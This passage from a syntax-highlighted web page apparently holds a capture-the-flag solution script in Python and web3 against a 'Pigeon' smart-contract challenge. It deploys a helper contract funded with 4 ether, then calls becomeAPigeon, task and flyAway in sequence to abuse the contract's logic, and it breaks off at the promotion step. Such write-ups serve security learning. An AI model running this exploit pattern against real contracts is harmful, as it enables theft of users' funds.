</span></span><span class="line"><span class="cl"><span class="c1"># setup_address = &#39;0x6719eb16425c24c5F2d707254735593b48954abd&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">uuid</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">uuid</span><span class="p">,</span> <span class="n">rpc_endpoint</span><span class="p">,</span> <span class="n">private_key</span><span class="p">,</span> <span class="n">setup_address</span> <span class="o">=</span> <span class="n">launch_instance</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Connect to the network</span>
</span></span><span class="line"><span class="cl"><span class="n">w3</span> <span class="o">=</span> <span class="n">Web3</span><span class="p">(</span><span class="n">Web3</span><span class="o">.</span><span class="n">HTTPProvider</span><span class="p">(</span><span class="n">rpc_endpoint</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">w3</span><span class="o">.</span><span class="n">is_connected</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">player</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">from_key</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Player address: </span><span class="si">{</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="si">}</span><span class="s1">, balance: </span><span class="si">{</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Get pigeon address</span>
</span></span><span class="line"><span class="cl"><span class="n">setup_abi</span> <span class="o">=</span> <span class="p">[{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;payable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;constructor&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;isSolved&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;pigeon&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract Pigeon&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;payable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;receive&#34;</span><span class="p">}]</span>
</span></span><span class="line"><span class="cl"><span class="n">setup_contract</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">setup_address</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">setup_abi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pass_selector</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">keccak</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s1">&#39;pigeon()&#39;</span><span class="p">)[:</span><span class="mi">4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">call</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;to&#39;</span><span class="p">:</span> <span class="n">setup_address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="n">pass_selector</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">pigeon_address</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">to_checksum_address</span><span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="mi">12</span><span class="p">:]</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;pigeon_address: </span><span class="si">{</span><span class="n">pigeon_address</span><span class="si">}</span><span class="s1">, balance: </span><span class="si">{</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">pigeon_address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Get current owner</span>
</span></span><span class="line"><span class="cl"><span class="n">pigeon_abi</span> <span class="o">=</span> <span class="p">[{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;constructor&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;string&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;code&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;string&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;string&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;string&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;pigeon&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;rank&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;assignPigeon&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;payable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;string&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;code&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;string&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;string&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;string&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;becomeAPigeon&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bytes32&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;codeName&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bytes32&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;exit&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bytes32&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;codeName&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bytes32&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;rank&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;flyAway&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bytes32&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;codeName&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bytes32&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;desiredRank&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;string&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;newCode&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;string&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;string&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;newName&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;string&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;promotion&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bytes32&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;codeName&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bytes32&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;person&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;data&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;task&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">}]</span>
</span></span><span class="line"><span class="cl"><span class="n">pigeon_contract</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">pigeon_address</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">pigeon_abi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pigeon_owner</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">to_checksum_address</span><span class="p">(</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_storage_at</span><span class="p">(</span><span class="n">pigeon_address</span><span class="p">,</span> <span class="mi">0</span><span class="p">)[</span><span class="mi">12</span><span class="p">:]</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;pigeon_owner: </span><span class="si">{</span><span class="n">pigeon_owner</span><span class="si">}</span><span class="s1">, balance: </span><span class="si">{</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">pigeon_owner</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Compile temp storage contract, initialize it with 4 ether</span>
</span></span><span class="line"><span class="cl"><span class="n">compiled_src</span> <span class="o">=</span> <span class="n">compile_files</span><span class="p">([</span><span class="s1">&#39;TempStorage.sol&#39;</span><span class="p">],</span> <span class="n">output_values</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;abi&#39;</span><span class="p">,</span> <span class="s1">&#39;bin&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">compiled_temp_storage</span> <span class="o">=</span> <span class="n">compiled_src</span><span class="p">[</span><span class="s1">&#39;TempStorage.sol:TempStorage&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">	<span class="s2">&#34;from&#34;</span><span class="p">:</span> <span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="s2">&#34;value&#34;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">to_wei</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s1">&#39;ether&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="s2">&#34;data&#34;</span><span class="p">:</span> <span class="n">compiled_temp_storage</span><span class="p">[</span><span class="s1">&#39;bin&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tx hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">rcpt</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_receipt</span><span class="p">(</span><span class="n">tx_hash</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">temp_storage_address</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">to_checksum_address</span><span class="p">(</span><span class="n">rcpt</span><span class="p">[</span><span class="s1">&#39;contractAddress&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;temp_storage_address: </span><span class="si">{</span><span class="n">temp_storage_address</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">temp_storage_contract</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">temp_storage_address</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">compiled_temp_storage</span><span class="p">[</span><span class="s1">&#39;abi&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Call become a pigeon</span>
</span></span><span class="line"><span class="cl"><span class="n">transaction</span> <span class="o">=</span> <span class="n">pigeon_contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">becomeAPigeon</span><span class="p">(</span><span class="s2">&#34;Numbu&#34;</span><span class="p">,</span> <span class="s2">&#34;h5&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">signed_transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">,</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed_transaction</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tx hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Call task twice</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Execute task[</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s1">]&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">code_name</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">solidity_keccak</span><span class="p">([</span><span class="s1">&#39;string&#39;</span><span class="p">,</span> <span class="s1">&#39;string&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s1">&#39;Numbu&#39;</span><span class="p">,</span> <span class="s1">&#39;h5&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">transaction</span> <span class="o">=</span> <span class="n">pigeon_contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">task</span><span class="p">(</span><span class="n">code_name</span><span class="p">,</span> <span class="n">temp_storage_address</span><span class="p">,</span> <span class="n">w3</span><span class="o">.</span><span class="n">to_wei</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s1">&#39;ether&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="n">signed_transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">,</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed_transaction</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tx hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Call flyaway</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Call flyAway&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">code_name</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">solidity_keccak</span><span class="p">([</span><span class="s1">&#39;string&#39;</span><span class="p">,</span> <span class="s1">&#39;string&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s1">&#39;Numbu&#39;</span><span class="p">,</span> <span class="s1">&#39;h5&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">transaction</span> <span class="o">=</span> <span class="n">pigeon_contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">flyAway</span><span class="p">(</span><span class="n">code_name</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">signed_transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">,</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed_transaction</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tx hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Player address: </span><span class="si">{</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="si">}</span><span class="s1">, balance: </span><span class="si">{</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Call promotion</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Call promotion&#39;</span><span class="p">)</span>
